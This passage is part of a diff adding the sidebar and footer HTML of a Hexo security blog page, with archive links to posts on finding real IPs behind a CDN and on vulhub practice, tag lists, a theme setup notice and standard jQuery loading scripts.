+            <span class="archive-post-date">11/15</span><a class="archive-post-title" href= "/2018/11/15/绕过云waf找真实ip/" >绕过cdn找真实ip</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/06</span><a class="archive-post-title" href= "/2018/11/06/琐碎知识/" >琐碎知识</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/16</span><a class="archive-post-title" href= "/2018/10/16/vul♂hub学习(二)/" >vul♂hub学习(二)</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="vulub"><span class="iconfont-archer">&#xe606;</span>vulub</span>
+    
+        <span class="sidebar-tag-name" data-tags="ELK"><span class="iconfont-archer">&#xe606;</span>ELK</span>
+    
+        <span class="sidebar-tag-name" data-tags="知识积累"><span class="iconfont-archer">&#xe606;</span>知识积累</span>
+    
+        <span class="sidebar-tag-name" data-tags="索引"><span class="iconfont-archer">&#xe606;</span>索引</span>
+    
+        <span class="sidebar-tag-name" data-tags="信息搜集"><span class="iconfont-archer">&#xe606;</span>信息搜集</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "Vorder"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
